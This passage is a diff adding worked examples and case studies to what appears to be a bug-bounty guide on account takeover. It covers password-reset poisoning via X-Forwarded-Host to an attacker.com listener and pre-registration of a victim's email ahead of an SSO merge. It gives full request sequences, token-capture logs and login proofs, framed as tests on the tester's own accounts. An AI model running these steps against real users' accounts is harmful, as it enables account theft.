@@ -93,6 +93,70 @@ Referer-based:  if the reset page loads attacker-controllable resources, the tok
 Trigger a reset **for the victim** (`B`), poison the host, and catch the token on your server when `B` clicks (or when the app server-side-fetches your host). → **you hold `B`'s valid reset token → set their password → ATO.**
 > **If this → then that:** the reset link in the email reflects your `Host`/`X-Forwarded-Host` → **0-click ATO via reset poisoning** (Critical) — cross-ref [../HostHeader/](../HostHeader/) for the header tricks. If only the *password-reset page* (not the email) is poisoned, the token can still leak via **`Referer`** to third-party scripts/images.
 
+## 2.1 Fully worked example — reset poisoning → ATO, start to finish
+
+> *In plain words:* the whole class on the wire, once, with two accounts you own (`A` = you, `B` = "victim"). Every value is benign; the moment you're inside `B`, you **stop and restore**. Follow it once and every host-header / Referer / `reset_url` variant reads as the same five moves.
+
+**The setup:** you control a listener at `attacker.com` (a VPS, or an interactsh/Collaborator host — anything that logs inbound requests). `B` is your own second account with email `victim-B@example.com`. The invariant you're breaking: **only `B` should ever hold `B`'s reset token.**
+
+**Step 1 — Trigger a reset *for `B`*, poisoning the host the link is built from (you, unauthenticated):**
+```http
+POST /api/password/forgot HTTP/2
+Host: target.com
+X-Forwarded-Host: attacker.com          ← the lie: middleware builds the link from this
+Content-Type: application/json
+
+{"email":"victim-B@example.com"}
+```
+```http
+HTTP/2 200 OK
+{"status":"if that account exists, a reset link has been sent"}
+```
+The generic response is deliberate (anti-enumeration) — it tells you nothing, which is *why* you prove impact by the token landing at your host, not by this body.
+
+**Step 2 — What the server actually mailed to `B`.** The token is real and minted against `B`'s account; only the **host** is yours:
+```
+To: victim-B@example.com     Subject: Reset your password
+Reset your password:  https://attacker.com/reset?token=b3F1c2R0a2Vu9aZ...   ← B's REAL token, on ATTACKER's host
+```
+
+**Step 3 — `B` clicks the link (a reset they may well have been expecting).** Their browser sends the token straight to **your** server — you never touched `B`:
+```
+[attacker.com listener]  GET /reset?token=b3F1c2R0a2Vu9aZ...  Host: attacker.com   src=<B's IP>
+```
+You now hold `B`'s valid reset token. *(Fully-0-click variants: if the reset **page** on `target.com` loads any attacker-influenced resource, the token leaks in the `Referer`; some mail clients pre-fetch links. Either way the token reaches you without `B` deciding to click.)*
+
+**Step 4 — Consume `B`'s token on the *real* site and set a password you know:**
+```http
+POST /api/password/reset HTTP/2
+Host: target.com
+Content-Type: application/json
+
+{"token":"b3F1c2R0a2Vu9aZ...","password":"AtoPoc-Marker-2026!"}
+```
+```http
+HTTP/2 200 OK
+{"status":"password updated"}
+```
+
+**Step 5 — Log in as `B` (the cross-account proof — this is the finding):**
+```http
+POST /api/login  {"email":"victim-B@example.com","password":"AtoPoc-Marker-2026!"}
+→ HTTP/2 200 OK   Set-Cookie: session=<B's session>
+GET /api/me  (with B's session)
+→ {"id":40217,"email":"victim-B@example.com","name":"Test Victim B"}     ← you are inside B
+```
+
+**What each step proved, and where to stop:**
+```
+Step 1  poisoned reset     → the link host came from YOUR header, not the server config (the root cause)
+Step 2  the email          → the token is B's, real, and points at attacker.com
+Step 3  listener hit        → B's secret token arrived at YOUR server (0-click for you; restore-safe)
+Step 4  password set        → you consumed B's token on the real origin
+Step 5  logged in as B      → "as an unauthenticated attacker, I am inside B's account" = Critical ATO
+```
+> **Stop and restore.** Reading `B`'s own email back from `/api/me` is a complete proof; do not read `B`'s data further, and **restore `B`'s password** (you own `B`, so reset it back). Report it as **CWE-640, unauth 0-click, CVSS `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`** (UI:R because `B` clicks; the Referer/pre-fetch variant drops to `UI:N` → ~9.8). **Real-world:** this is the class James Kettle documented in *Practical HTTP Host Header Attacks* (2013, against Django/Gallery and others) and that PortSwigger's Academy still teaches — the mechanism has survived a decade because framework middleware keeps trusting `X-Forwarded-Host` (see the case studies before Part VIII).
+
 # 3. Reset-token leakage
 
 ```
@@ -215,6 +279,48 @@ CLASSIC merge/overwrite:
 ```
 > **If this → then that:** you can **register the victim's email unverified** and later their **SSO login lands in your account** → **pre-account-takeover** (High/Critical, 0-click for the victim). This is the bug most programs pay well for and most hunters miss — always test "register victim's email, then SSO as victim."
 
+## 10.1 Fully worked example — pre-account-takeover (the "classic-federated merge"), start to finish
+
+> *In plain words:* §2 attacked an account that *exists*; this attacks one **before it exists** — you claim `B`'s identity, then wait for `B` to walk into the account you already control. It's invisible (no reset, no hijack event to alert anyone) and 0-click for the victim. Use your own second email as "`B`".
+
+**Step 1 — Claim `B`'s email now, with a password *you* choose (verification not enforced):**
+```http
+POST /api/register HTTP/2
+Host: target.com
+Content-Type: application/json
+
+{"email":"victim-B@example.com","password":"Attacker-Knows-This-1!"}
+```
+```http
+HTTP/2 201 Created
+{"id":88102,"email":"victim-B@example.com","email_verified":false}   ← a half-account EXISTS, unverified, and it's yours
+```
+Many apps let you sit here indefinitely: the account is created and "owns" the email, they just nag you to verify. (If the app *does* require verification to finish, look for a variant: an unverified account that still *reserves* the email, or an invite/join-org flow that trusts an attacker-supplied email.)
+
+**Step 2 — Wait. You do nothing to `B`.** (This is what makes it 0-click and silent.)
+
+**Step 3 — `B` later signs up the "normal" way — via SSO.** `B` clicks *Sign in with Google*; Google asserts the verified identity `victim-B@example.com` back to the app:
+```
+Google → target.com:   id_token { email: "victim-B@example.com", email_verified: true, sub: "google-oauth2|B" }
+```
+The app sees that email **already has an account** (yours, from Step 1) and — the vulnerable behaviour — **merges/links the Google identity into your pre-existing record** instead of creating a fresh, separate account. `B` is now inside the account whose password *you* set.
+
+**Step 4 — Log in as `B` anytime, with the password from Step 1 (cross-account proof):**
+```http
+POST /api/login  {"email":"victim-B@example.com","password":"Attacker-Knows-This-1!"}
+→ HTTP/2 200 OK   Set-Cookie: session=<B's session>
+GET /api/me  → {"email":"victim-B@example.com","org":"B's company","documents":[...]}    ← shared account: you + B
+```
+`B` uses SSO and never sees a password prompt, so they never notice you also hold a password to the same account. You read their data whenever you like.
+
+**What each step proved, and where to stop:**
+```
+Step 1  register B's email → the app let an UNVERIFIED account claim an identity you don't own (the root cause)
+Step 3  B's SSO merge       → the federated login joined YOUR record instead of a fresh one (the vulnerable merge)
+Step 4  login as B          → "I share B's account and hold a password to it" = pre-account-takeover, High/Critical
+```
+> **Stop and restore.** Confirm the merge with one `/api/me` read, then delete your pre-registered account so `B` isn't left sharing it. **Real-world:** this is the *Classic-Federated Merge* from Sudhodanan & Paverd (Microsoft), **"Pre-hijacking Attacks on Web User Accounts," USENIX Security 2022** — they found **35 of 75** popular services vulnerable to at least one of five pre-hijack variants. The one-line test that finds it: *register the victim's email, then SSO in as the victim and see whose account you land in.* Cross-ref [../OAuth/](../OAuth/) for the unverified-email linking mechanics.
+
 ---
 
 # PART V — SESSION & TOKEN ATTACKS
@@ -283,6 +389,34 @@ Race (../RaceCondition/)   → parallel OTP/reset/coupon → bypass single-use l
 □ REPLAY: reuse a one-time token/OTP/magic-link; use a step's token out of order or for another user.
 ```
 > **If this → then that:** a step's decision is made **client-side** (a boolean in the response) → **flip it** to skip 2FA/verification. `email_verified` accepted on registration → mark the victim's email verified for the pre-ATO chain.
+
+---
+
+# Real-world ATO case studies (learn the pattern, not just the payload)
+
+> Each of these is a *documented* class or landmark finding. Read them for the **shape** — a small primitive (a trusted header, an unverified email, a resettable counter) driven all the way to takeover. That shape is exactly what you're reproducing with your two test accounts.
+
+### Case 1 — Password-reset poisoning via the `Host`/`X-Forwarded-Host` header (the §2 flagship)
+- **What:** James Kettle's *Practical HTTP Host Header Attacks* (2013) showed that frameworks build the reset link from the request `Host` (or `X-Forwarded-Host` once middleware/proxies are involved) — so an attacker's host lands in the victim's reset email. It hit **Django**, **Gallery**, and others at the time, and the class is *still* alive (PortSwigger Academy's "Password reset poisoning via middleware" lab, and a long tail of HackerOne reports).
+- **Mechanism:** link host sourced from an attacker-controlled header instead of server config → victim's real token delivered to the attacker's domain (§2.1).
+- **Lesson:** the reset token can be perfectly random and single-use and *still* lose — because the failure is **where the link points**, not the token's strength. Always read the actual email and check the link's host.
+
+### Case 2 — Pre-hijacking / pre-account-takeover (the §10 quiet money bug)
+- **What:** Sudhodanan & Paverd (Microsoft), *"Pre-hijacking Attacks on Web User Accounts,"* **USENIX Security 2022** — a systematic study of **75** popular services found **35 vulnerable** to at least one of **five** pre-hijack variants (Classic-Federated Merge, Unexpired Session, Trojan Identifier, Unexpired Email-Change, Non-Verifying IdP).
+- **Mechanism:** an account created *before* the victim (with the victim's email, unverified) survives until the victim's SSO login merges into it (§10.1).
+- **Lesson:** takeover doesn't require an existing account — claiming an identity **ahead of time** is a whole attack family. Test every "register an email you don't own" + "SSO merge" path.
+
+### Case 3 — Brute-forcing recovery/OTP codes by defeating the rate-limit
+- **What:** Laxman Muthiyah's research on **Instagram** account recovery (2019) and later a **Microsoft** account password reset (2021) showed a 6-digit recovery code (1,000,000 values) is crackable when the rate-limit can be beaten with **massive concurrency across many source IPs** — the codes reportedly earned five-figure bounties.
+- **Mechanism:** the "you only get a few tries" assumption collapses under parallel/distributed requests (the race angle, [../RaceCondition/](../RaceCondition/) §10) — the limiter counts too slowly, or per-IP, and thousands of guesses land before it engages (§7).
+- **Lesson:** "there's a 5-attempt lock" is not the same as "the code is unguessable." Probe whether the limit is per-account, per-IP, resettable by re-requesting, or race-able — on **your own** account, bounded (§18).
+
+### Case 4 — IDOR / mass-assignment on the account-update endpoint → direct ATO (the §12 everyday Critical)
+- **What:** a recurring HackerOne pattern — a `PUT /api/users/{id}` or a profile-update body that accepts `email`/`role`/`isAdmin` without object-level authorization, letting account `A` change account `B`'s email (then reset) or grant itself admin.
+- **Mechanism:** missing **object-level authz** on a state-changing account field (§12) — the most common *authenticated* route to ATO.
+- **Lesson:** check *every* "update account" call with two accounts by swapping the id and by adding sensitive fields; a single unguarded `userId` is a Critical.
+
+> **The through-line:** in all four, the reported finding is the **takeover**, and the "bug" (trusted header, unverified email, weak limiter, missing authz) is named only as the *mechanism*. That's exactly how you should write yours (§19).
 
 ---
 
